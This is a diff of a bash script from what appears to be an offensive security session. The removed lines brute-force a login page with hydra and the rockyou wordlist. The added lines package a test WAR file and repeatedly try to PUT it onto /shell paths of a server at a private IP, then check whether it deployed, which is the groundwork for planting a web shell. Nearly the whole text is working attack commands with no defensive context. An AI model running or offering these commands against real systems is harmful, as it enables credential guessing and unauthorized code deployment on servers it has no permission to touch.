@@ -1,10 +1,13 @@
-#!/bin/bash
-
-# Start hydra
-hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -f -o -v -b 4 http://example.com/login
-
-# Monitor the brute force progress
-while true; do
-    sleep 1
-    hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -f -o -v -b 4 http://example.com/login | grep "done"
-done
+mkdir -p testwar/WEB-INF
+cat > testwar/index.jsp <<'EOF'
+<%= "hello" %>
+EOF
+cd testwar && zip -r ../test.war . && cd ..
+curl -T test.war "http://172.17.17.118:8080/shell"
+curl -T test.war "http://172.17.17.118:8080/shell/"
+curl -X PUT --data-binary @test.war "http://172.17.17.118:8080/shell"
+curl -X PUT --data-binary @test.war "http://172.17.17.118:8080/shell/"
+curl -i http://172.17.17.118:8080/shell/
+curl -i http://172.17.17.118:8080/shell/index.jsp
+curl -X PUT --data-binary @test.war "http://172.17.17.118:8080/shell/test.war"
+curl -X PUT --data-binary @test.war "http://172.17.17.118:8080/shell.war"
